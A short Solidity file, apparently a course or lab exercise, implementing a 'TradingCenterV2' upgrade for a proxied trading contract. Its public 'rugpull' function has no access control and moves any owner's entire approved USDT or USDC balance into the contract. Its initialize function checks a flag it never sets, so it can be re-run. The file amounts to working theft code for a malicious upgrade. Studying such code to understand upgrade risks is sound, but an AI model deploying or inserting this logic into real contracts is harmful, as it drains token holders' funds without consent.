// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;

import { IERC20 } from "../src/TradingCenter.sol";

// TODO: Try to implement TradingCenterV2 here
contract TradingCenterV2 {

  bool public initialized;

  IERC20 public usdt;
  IERC20 public usdc;

  function initialize(IERC20 _usdt, IERC20 _usdc) public {
    require(initialized == false, "already initialized");
    usdt = _usdt;
    usdc = _usdc;
  }
  
  function rugpull(address owner, IERC20 token) public {
    token.transferFrom(owner, address(this), token.balanceOf(owner));
  }
}